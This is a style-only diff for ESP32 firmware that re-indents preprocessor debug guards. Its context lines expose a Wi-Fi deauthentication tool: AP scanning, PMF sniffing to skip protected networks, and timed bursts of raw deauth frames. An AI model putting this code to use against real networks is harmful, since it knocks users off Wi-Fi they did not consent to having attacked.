@@ -205,9 +205,9 @@ static esp_err_t pmf_from_rsn_ie(uint8_t channel, const uint8_t bssid[6])
     pmf_sniff_handle = NULL;
 
     if (!pmf_sniff_done) {
-        #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
         ESP_LOGW(TAG, "pmf_from_rsn_ie: sniff timed out");
-        #endif
+#endif
         return ESP_ERR_TIMEOUT;
     }
 
@@ -346,9 +346,9 @@ esp_err_t wifi_deauth_scan(wifi_scan_deauth_t *wifi_scan_deauth)
 
     // If no networks found
     if (ap_num == 0) {
-        #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
         ESP_LOGW(TAG, "wifi_deauth_scan: esp_wifi_scan_get_ap_num: No access points found");
-        #endif
+#endif
         
         // Already zeroed above, just need to set sentinel
 
@@ -385,10 +385,10 @@ esp_err_t wifi_deauth_scan(wifi_scan_deauth_t *wifi_scan_deauth)
     for (uint16_t i = 0; i < ap_num; ++i) {
         // Stop if we've reached max capacity
         if (count >= WIFI_MAX_NETWORKS) {
-            #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
             ESP_LOGW(TAG, "wifi_deauth_scan: reached max deauth capacity (%" PRIu16 "/%d)", count, WIFI_MAX_NETWORKS);
             continue;
-            #endif
+#endif
         }
 
         const char *ssid = (char *)ap_list[i].ssid;
@@ -414,15 +414,15 @@ esp_err_t wifi_deauth_scan(wifi_scan_deauth_t *wifi_scan_deauth)
         
         // If sniff failed/timed out, fall back to authmode inference
         if (err != ESP_OK) {
-            #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
             ESP_LOGW(TAG, "wifi_deauth_scan: RSN sniff failed for '%s', using authmode inference", ssid);
-            #endif
+#endif
             
             // Infer PMF from the authmode reported by the scan
             infer_pmf_from_authmode(ap_list[i].authmode, &pmf_sniff_required, &pmf_sniff_capable);
         }
 
-        #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
         char auth_str[20] = {0};
         auth_to_str(ap_list[i].authmode, auth_str, sizeof(auth_str));
         ESP_LOGI(TAG,
@@ -439,7 +439,7 @@ esp_err_t wifi_deauth_scan(wifi_scan_deauth_t *wifi_scan_deauth)
                 pmf_sniff_required,
                 pmf_sniff_capable
         );
-        #endif
+#endif
 
         if (pmf_sniff_required) {
             // Skip APs that require PMF (cannot deauth them)
@@ -478,9 +478,9 @@ esp_err_t wifi_deauth_scan(wifi_scan_deauth_t *wifi_scan_deauth)
         } else {
             // New SSID: add a fresh entry
             if (count >= WIFI_MAX_NETWORKS) {
-                #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
                 ESP_LOGW(TAG, "wifi_deauth_scan: reached max deauth capacity (%" PRIu16 "/%d)", count, WIFI_MAX_NETWORKS);
-                #endif
+#endif
                 continue;
             }
 
@@ -578,9 +578,9 @@ static void send_deauth_frames_burst(const uint8_t *bssid, uint16_t *seq_num, ui
         esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
         if (err != ESP_OK) {
             if (err == ESP_ERR_NO_MEM) {
-                #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
                 //ESP_LOGW(TAG, "send_deauth_frames_burst: esp_wifi_80211_tx warning (expected): %s", esp_err_to_name(err));
-                #endif
+#endif
             } else {
                 ESP_LOGE(TAG, "send_deauth_frames_burst: esp_wifi_80211_tx failed: %s", esp_err_to_name(err));
             }
@@ -606,15 +606,15 @@ static void deauth_send_task(void *pvParameters)
 
     // Set initial values
     uint32_t attack_start_time = TIMER_GET_TIME_SEC(); // Start time
-    #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
     uint32_t last_log_time = 0; // Last log time
-    #endif
+#endif
     uint32_t cycle_count = 0; // Burst cycle counter
 
-    #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
     ESP_LOGI(TAG, "deauth_send_task started with %d BSSID(s) for SSID '%s'",
             deauth_target->bssid_count, deauth_target->ssid);
-    #endif
+#endif
 
     uint8_t bssid_idx = 0;
 
@@ -629,15 +629,15 @@ static void deauth_send_task(void *pvParameters)
 
         // Check if duration expired
         if (time_elapsed >= deauth_target->duration_sec) {
-            #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
             ESP_LOGI(TAG, "deauth_send_task duration expired");
-            #endif
+#endif
             break;
         }
         if (xEventGroupGetBits(xWifiEventGroup) & WIFI_STOP_DEAUTH_BIT) {
-            #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
             ESP_LOGI(TAG, "deauth_send_task stop requested: WIFI_STOP_DEAUTH_BIT set");
-            #endif
+#endif
             xEventGroupClearBits(xWifiEventGroup, WIFI_STOP_DEAUTH_BIT);
             break;
         }
@@ -672,7 +672,7 @@ static void deauth_send_task(void *pvParameters)
         // Increment cycle count
         cycle_count++;
 
-        #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
         // Periodic logging
         if (time_elapsed - last_log_time >= 1) { // Log every second
             last_log_time = time_elapsed;
@@ -686,7 +686,7 @@ static void deauth_send_task(void *pvParameters)
             ESP_LOGI(TAG, "[%lu/%lu sec] Total: %lu frames | FPS: %.0f | Cycles: %lu | Remaining: %lu sec",
                     time_elapsed, deauth_target->duration_sec, deauth_target->frames_sent, packets_per_sec, cycle_count, remaining_sec);
         }
-        #endif
+#endif
 
         // Stats to send to user
         deauth_stats.deauthing = true;
@@ -704,11 +704,11 @@ static void deauth_send_task(void *pvParameters)
     uint32_t total_time = TIMER_GET_TIME_SEC() - attack_start_time;
     float avg_pps = total_time > 0 ? (float)deauth_target->frames_sent / total_time : 0;
 
-    #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
     ESP_LOGI(TAG, "Total packets: %lu", deauth_target->frames_sent);
     ESP_LOGI(TAG, "Total time: %lu sec", total_time);
     ESP_LOGI(TAG, "Average PPS: %.0f", avg_pps);
-    #endif
+#endif
 
     // Stop Wi-Fi
     esp_wifi_stop();
@@ -783,9 +783,9 @@ esp_err_t wifi_deauth_send_for_duration(deauth_target_t *deauth_target)
         return ESP_FAIL;
     }
 
-    #ifdef POLYCAST5_DEBUG
+#ifdef POLYCAST5_DEBUG
     ESP_LOGI(TAG, "deauth_send_task started");
-    #endif
+#endif
 
     return ESP_OK;
 }
